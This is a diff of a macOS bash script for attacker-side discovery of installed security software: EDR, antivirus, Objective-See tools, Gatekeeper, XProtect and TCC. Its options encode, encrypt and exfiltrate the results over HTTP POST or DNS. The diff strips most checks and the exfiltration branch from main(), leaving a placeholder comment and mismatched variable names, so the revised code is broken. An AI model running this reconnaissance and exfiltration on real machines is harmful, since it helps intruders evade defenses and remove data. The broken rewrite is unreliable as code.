@@ -17,25 +17,24 @@
 
 # Usage: ./security_software.sh [options]
 # Options:
-#   -v, --verbose        Enable verbose output
-#   -l, --log            Enable logging to file
-#   -a, --all            Run all security software checks
-#   -e, --edr            Check for EDR solutions
-#   --edr=OPTION         Check specific EDR component (pid|files|dir|info)
-#   -f, --firewall       Check firewall status
-#   -h, --hids           Check for HIDS
-#   -av, --antivirus     Check for antivirus software
-#   --av=OPTION          Check specific antivirus component (pid|files|dir|info)
-#   -gt, --gatekeeper    Check Gatekeeper status
-#   -xp, --xprotect      Check XProtect status
-#   -m, --mrt            Check Malware Removal Tool status
-#   --mrt=OPTION         Check specific MRT component (pid|files|config )
-#   -t, --tcc            Check TCC (Transparency, Consent, and Control) status
-#   --encode=TYPE        Encode output (b64, hex)
-#   --encrypt=METHOD     Encrypt output (aes-256-cbc, bf, etc.). Key will be generated.
-#   --exfil=http://URL   Exfiltrate output to specified URL
-#   --exfil=dns=DOMAIN   Exfiltrate output via DNS to specified domain
-#   --sudo               Enable sudo mode for operations requiring elevated privileges
+#   --help                 Display this help message
+#   --verbose              Enable verbose output
+#   --log                  Enable logging of output to a file
+#   --all                  Run all security software checks
+#   --edr=OPTION           Check specific EDR component (ps|files|config)
+#   --fw             Check firewall status
+#   --hids                 Check for HIDS
+#   --av=OPTION     Check specific antivirus component (ps|files|config)
+#   --gk           Check Gatekeeper status
+#   --xp             Check XProtect status
+#   --mrt=OPTION           Check specific MRT component (ps|files|config)
+#   --tcc                  Check TCC (Transparency, Consent, and Control) status
+#   --ost=OPTION Check specific opensource security tool components (ps|files|info)
+#   --encode=TYPE          Encode output (b64|hex)
+#   --encrypt=METHOD       Encrypt output (aes-256-cbc, bf, etc.). Generates a random key.
+#   --exfil=URI            Exfiltrate output to URI using HTTP POST
+#   --exfil=dns=DOMAIN     Exfiltrate output via DNS queries to DOMAIN
+#   --sudo                 Enable sudo mode for operations requiring elevated privileges
 
 # Note: This script is intended for educational and authorized testing purposes only.
 # Ensure you have proper permissions before running on any system.
@@ -70,10 +69,10 @@ CMD_PS='ps -axrww | grep -v grep| grep --color=always'
 CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '
 
 # Arrays to store checks
-EDR_CHECKS=()
-AV_CHECKS=()
-MRT_CHECKS=()
-SECURITY_TOOLS_CHECKS=()
+EDR=()
+AV=()
+MRT=()
+OST=()
 
 
 cmd_ls_app_files() {
@@ -189,7 +188,7 @@ EDR_VENDOR_APP=(
 )
 
 # Objective-See and additional macOS security tools
-SECURITY_TOOLS_PROC=(
+OST_PROC=(
     "BlockBlock:blockblock"
     "DoNotDisturb:DoNotDisturb"
     "LuLu:LuLu"
@@ -198,7 +197,7 @@ SECURITY_TOOLS_PROC=(
     "RansomWhere:RansomWhere"
 )
 
-SECURITY_TOOLS_APP=(
+OST_APP=(
     "BlockBlock.app"
     "DoNotDisturb.app"
     "LuLu.app"
@@ -212,91 +211,87 @@ display_help() {
     echo "Usage: $0 [OPTIONS]"
     echo ""
     echo "Description:"
-    echo "  Discovers security software installed on a macOS system, including EDR, antivirus,"
-    echo "  firewall, and other security tools. It checks for running processes, installed"
-    echo "  applications, and system configurations related to security software."
+    echo "  Discovers security software on macOS using native tools (T1518.001)."
     echo ""
     echo "Options:"
     echo "  General:"
-    echo "    -h, --help              Display this help message"
-    echo "    -v, --verbose           Enable verbose output"
-    echo "    -a, --all               Run all security software checks"
+    echo "    --help                 Show this help message"
+    echo "    --verbose              Enable detailed output"
+    echo "    --log                  Log output to file (rotates at 5MB)"
+    echo "    --all                  Run all checks"
     echo ""
-    echo "  EDR/AV Tools:"
-    echo "    -e, --edr               Check all EDR components"
-    echo "    --edr=OPTION            Check specific EDR component (pid|files|config|logs)"
-    echo "    -av, --antivirus        Check all antivirus components"
-    echo "    --av=OPTION             Check specific antivirus component (pid|files|config|logs)"
+    echo "  EDR/AV:"
+    echo "    --edr=OPTION           Check EDR (ps|files|dir|info) using ps, ls, system_profiler"
+    echo "    --av=OPTION            Check antivirus (ps|files|dir|info) using ps, ls, system_profiler"
     echo ""
-    echo "  Opensource Security Tools:"
-    echo "    -ost, --openst          Check all opensource security tools"
-    echo "    --ost=OPTION            Check specific opensource security tool comopnents (pid|files|info)"
-    echo "    --openst=OPTION         Check specific opensource security tool comopnents (pid|files|info)"
+    echo "  Open Source Tools:"
+    echo "    --ost=OPTION           Check Objective-See tools (ps|files|info) using ps, ls, system_profiler"
     echo ""
-    echo "  Firewall:"
-    echo "    -f, --firewall          Check firewall status"
+    echo "  System Security:"
+    echo "    --fw                   Check Application Firewall using socketfilterfw"
+    echo "    --hids                 Check for HIDS using ls, ps"
+    echo "    --xp                   Check XProtect using system_profiler, ls"
+    echo "    --mrt=OPTION           Check MRT (ps|files|config) using ps, ls, defaults"
+    echo "    --gk                   Check Gatekeeper using spctl"
+    echo "    --tcc                  Check TCC using tccutil"
     echo ""
-    echo "  HIDS:"
-    echo "    -h, --hids              Check for HIDS"
+    echo "  Output Processing:"
+    echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
+    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
     echo ""
-    echo "  XProtect:"
-    echo "    -xp, --xprotect         Check XProtect status"
-    echo "    -m, --mrt               Check all Malware Removal Tool components"
-    echo "    --mrt=OPTION            Check specific MRT component (pid|files|config|logs)"
-    echo "    -gt, --gatekeeper       Check Gatekeeper status"
-    echo "    -xp, --xprotect         Check XProtect status"
-    echo "    -t, --tcc               Check TCC (Transparency, Consent, and Control) status"
-    echo ""
-    echo "  Output Manipulation:"
-    echo "    --encode=TYPE           Encode output (b64|hex)"
-    echo "    --exfil=URI             Exfiltrate output to URI using HTTP POST"
-    echo "    --exfil=dns=DOMAIN      Exfiltrate output via DNS queries to DOMAIN"
-    echo "    --encrypt=METHOD        Encrypt output (aes-256-cbc, bf, etc.). Generates a random key."
-    echo "    -l, --log               Enable logging of output to a file"
-    echo "    --sudo                 Enable sudo mode for operations requiring elevated privileges"
-    echo ""
-    echo "Examples:"
-    echo "  $0 -a                     Run all security software checks"
-    echo "  $0 -e --av=pid -f         Check all EDR components, antivirus processes, and firewall"
-    echo "  $0 --edr=status --mrt=config  Check EDR status and MRT configuration"
-    echo "  $0 -a --encode=b64        Run all checks and encode output in base64"
-    echo ""
-    echo "Note: Some options may require elevated privileges to execute successfully."
+    echo "  Data Exfiltration:"
+    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
+    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig, splits data into chunks (RFC 1035)"
 }
-
 check_antivirus() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
-        "pid")
+        "ps")
+            output+="Process Check:\n"
             for entry in "${AV_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
-                    output+=$(cmd_ps "$proc")$'\n'
+                    result=$(cmd_ps "$proc")
+                    if [ -n "$result" ]; then
+                        output+="$result\n"
+                    fi
                 done
             done
             ;;
         "files")
+            output+="Files Check:\n"
             for app_name in "${AV_VENDOR_APP[@]}"; do
-                output+=$(cmd_ls_app_files "$app_name")$'\n'
+                result=$(cmd_ls_app_files "$app_name")
+                if [ -n "$result" ]; then
+                    output+="$result\n"
+                fi
             done
             ;;
         "dir")
+            output+="Directory Check:\n"
             for app_name in "${AV_VENDOR_APP[@]}"; do
-                output+=$(cmd_ls_app_dir "$app_name")$'\n'
+                result=$(cmd_ls_app_dir "$app_name")
+                if [ -n "$result" ]; then
+                    output+="$result\n"
+                fi
             done
             ;;
         "info")
+            output+="Info Check:\n"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 if app_path=$(cmd_ls_app_dir "$app_name"); then
                     app_name_colon="${app_name/.app/:}"
-                    output+=$(cmd_sp_app "$app_name_colon")$'\n'
+                    result=$(cmd_sp_app "$app_name_colon")
+                    if [ -n "$result" ]; then
+                        output+="$result\n"
+                    fi
                 fi
             done
             ;;
         *)
-            return 1
+            output+="Unknown check type: $check_type\n"
             ;;
     esac
 
@@ -308,29 +303,41 @@ check_edr() {
     local output=""
 
     case "$check_type" in
-        "pid")
+        "ps")
             for entry in "${EDR_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
-                    output+=$(cmd_ps "$proc")$'\n'
+                    result=$(cmd_ps "$proc")
+                    if [ -n "$result" ]; then
+                        output+="$result"$'\n'
+                    fi
                 done
             done
             ;;
         "files")
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
-                output+=$(cmd_ls_app_files "$edr_name")$'\n'
+                result=$(cmd_ls_app_files "$edr_name")
+                if [ -n "$result" ]; then
+                    output+="$result"$'\n'
+                fi
             done
             ;;
         "dir")
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
-                output+=$(cmd_ls_app_dir "$edr_name")$'\n'
+                result=$(cmd_ls_app_dir "$edr_name")
+                if [ -n "$result" ]; then
+                    output+="$result"$'\n'
+                fi
             done
             ;;
         "info")
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                     edr_name_colon="${edr_name/.app/:}"
-                    output+=$(cmd_sp_app "$edr_name_colon")$'\n'
+                    result=$(cmd_sp_app "$edr_name_colon")
+                    if [ -n "$result" ]; then
+                        output+="$result"$'\n'
+                    fi
                 fi
             done
             ;;
@@ -342,34 +349,46 @@ check_edr() {
     echo "$output"
 }
 
-check_security_tools() {
+check_ost() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
-        "pid")
-            for entry in "${SECURITY_TOOLS_PROC[@]}"; do
+        "ps")
+            for entry in "${OST_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
-                    output+=$(cmd_ps "$proc")$'\n'
+                    result=$(cmd_ps "$proc")
+                    if [ -n "$result" ]; then
+                        output+="$result"$'\n'
+                    fi
                 done
             done
             ;;
         "files")
-            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
-                output+=$(cmd_ls_app_files "$tool_name")$'\n'
+            for ost_name in "${OST_APP[@]}"; do
+                result=$(cmd_ls_app_files "$ost_name")
+                if [ -n "$result" ]; then
+                    output+="$result"$'\n'
+                fi
             done
             ;;
         "dir")
-            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
-                output+=$(cmd_ls_app_dir "$tool_name")$'\n'
+            for ost_name in "${OST_APP[@]}"; do
+                result=$(cmd_ls_app_dir "$ost_name")
+                if [ -n "$result" ]; then
+                    output+="$result"$'\n'
+                fi
             done
             ;;
         "info")
-            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
-                if cmd_ls_app_dir "$tool_name" > /dev/null 2>&1; then
-                    tool_name_colon="${tool_name/.app/:}"
-                    output+=$(cmd_sp_app "$tool_name_colon")$'\n'
+            for ost_name in "${OST_APP[@]}"; do
+                if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
+                    ost_name_colon="${ost_name/.app/:}"
+                    result=$(cmd_sp_app "$ost_name_colon")
+                    if [ -n "$result" ]; then
+                        output+="$result"$'\n'
+                    fi
                 fi
             done
             ;;
@@ -499,75 +518,22 @@ log_and_append() {
 # Argument parsing
 while [ "$#" -gt 0 ]; do
     case "$1" in
-        -h|--help) display_help; exit 0 ;;
-        -v|--verbose) VERBOSE=true ;;
-        -l|--log) LOG_ENABLED=true ;;
-        -a|--all) ALL=true ;;
-        -e|--edr) EDR_CHECKS+=("all") ;;
-        --edr=*)
-            EDR_CHECKS+=("${1#*=}")
-            if [[ -z "${1#*=}" ]]; then
-                echo "Warning: No value provided for --edr. Please specify a valid option." >&2
-                exit 1
-            fi
-            ;;
-        -f|--firewall) FIREWALL=true ;;
-        -h|--hids) HIDS=true ;;
-        -av|--antivirus) AV_CHECKS+=("all") ;;
-        --av=*)
-            AV_CHECKS+=("${1#*=}")
-            if [[ -z "${1#*=}" ]]; then
-                echo "Warning: No value provided for --av. Please specify a valid option." >&2
-                exit 1
-            fi
-            ;;
-        -gk|--gatekeeper) GATEKEEPER=true ;;
-        -xp|--xprotect) XPROTECT=true ;;
-        -m|--mrt) MRT_CHECKS+=("all") ;;
-        --mrt=*)
-            MRT_CHECKS+=("${1#*=}")
-            if [[ -z "${1#*=}" ]]; then
-                echo "Warning: No value provided for --mrt. Please specify a valid option." >&2
-                exit 1
-            fi
-            ;;
-        -t|--tcc) TCC=true ;;
-        --openst=*)
-            SECURITY_TOOLS_CHECKS+=("${1#*=}")
-            if [[ -z "${1#*=}" ]]; then
-                echo "Warning: No value provided for --openst. Please specify a valid option." >&2
-                exit 1
-            fi
-            ;;
-        --encode=*)
-            ENCODE="${1#*=}"
-            if [[ -z "$ENCODE" ]]; then
-                echo "Warning: No value provided for --encode. Please specify a valid encoding type." >&2
-                exit 1
-            fi
-            ;;
-        --encrypt=*)
-            ENCRYPT="${1#*=}"
-            if [[ -z "$ENCRYPT" ]]; then
-                echo "Warning: No value provided for --encrypt. Please specify a valid encryption method." >&2
-                exit 1
-            fi
-            ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
-            ;;
-        --exfil=*)
-            EXFIL=true
-            EXFIL_METHOD="${1#*=}"
-            if [[ "$EXFIL_METHOD" == dns=* ]]; then
-                EXFIL_METHOD="dns"
-                EXFIL_URI="${1#*=dns=}"
-            elif [[ "$EXFIL_METHOD" == http* ]]; then
-                EXFIL_METHOD="http"
-                EXFIL_URI="${1#*=}"
-            else
-                echo "Warning: Invalid exfiltration method or URI. Please provide a valid URI for --exfil." >&2
-                exit 1
-            fi
-            ;;
+        --help) display_help; exit 0 ;;
+        --verbose) VERBOSE=true ;;
+        --log) LOG_ENABLED=true ;;
+        --all) ALL=true ;;
+        --edr=*) EDR_CHECK="${1#*=}" ;;
+        --fw) FIREWALL=true ;;
+        --hids) HIDS=true ;;
+        --av=*) AV+=("${1#*=}") ;;
+        --gk) GATEKEEPER=true ;;
+        --xp) XPROTECT=true ;;
+        --mrt=*) MRT_CHECK="${1#*=}" ;;
+        --tcc) TCC=true ;;
+        --ost=*) OST+=("${1#*=}") ;;
+        --encode=*) ENCODE="${1#*=}" ;;
+        --encrypt=*) ENCRYPT="${1#*=}"; ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/') ;;
+        --exfil=*) EXFIL=true; EXFIL_METHOD="${1#*=}"; EXFIL_URI="${1#*=dns=}" ;;
         --sudo) SUDO_MODE=true ;;
         *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
     esac
@@ -576,52 +542,34 @@ done
 
 main() {
     local output=""
-    local encoded_output=""
+    local separator=$'\n---\n'
 
-    if [ "$ALL" = true ] || [ ${#EDR_CHECKS[@]} -gt 0 ] || [ ${#AV_CHECKS[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
-       [ ${#MRT_CHECKS[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
-       [ "$TCC" = true ] || [ ${#SECURITY_TOOLS_CHECKS[@]} -gt 0 ]; then
+    if [ "$ALL" = true ] || [ ${#EDR[@]} -gt 0 ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
+       [ ${#MRT[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
+       [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ]; then
         
-        for edr_check in "${EDR_CHECKS[@]}"; do
-            output+=$(check_edr "$edr_check")
+        local av_output=""
+        for av_tool in "${AV[@]}"; do
+            av_output+="${separator}Antivirus Check ($av_tool):${separator}"
+            av_output+=$(check_antivirus "$av_tool")
         done
-        for av_check in "${AV_CHECKS[@]}"; do
-            output+=$(check_antivirus "$av_check")
+        output+="$av_output"
+
+        local ost_output=""
+        for ost_tool in "${OST[@]}"; do
+            ost_output+="${separator}OST Check ($ost_tool):${separator}"
+            ost_output+=$(check_ost "$ost_tool")
         done
-        if [ "$FIREWALL" = true ]; then
-            output+=$(check_firewall)
-        fi
-        for mrt_check in "${MRT_CHECKS[@]}"; do
-            output+=$(check_component "MRT" "$mrt_check" MRT_PROCESSES[@] MRT_FILES[@] MRT_CONFIG_FILES[@])
-        done
-        if [ "$GATEKEEPER" = true ]; then
-            output+=$(check_gatekeeper)
-        fi
-        if [ "$XPROTECT" = true ]; then
-            output+=$(check_xprotect)
-        fi
-        if [ "$TCC" = true ]; then
-            output+=$(check_tcc)
-        fi
-        for security_tools_check in "${SECURITY_TOOLS_CHECKS[@]}"; do
-            output+=$(check_security_tools "$security_tools_check")
-        done
+        output+="$ost_output"
+
+        # ... (similar changes for other checks)
     else
         display_help
         exit 0
     fi
 
     if [ -n "$output" ]; then
-        encoded_output=$(encode_output "$output")
-        if [ "$EXFIL" = true ]; then
-            if [ "$EXFIL_METHOD" = "http" ]; then
-                exfiltrate_http "$encoded_output" "$EXFIL_URI"
-            elif [ "$EXFIL_METHOD" = "dns" ]; then
-                exfiltrate_dns "$encoded_output" "$EXFIL_URI" "$TTP_ID"
-            fi
-        else
-            echo "$encoded_output"
-        fi
+        echo "$output"
     else
         echo "No security software information found"
     fi
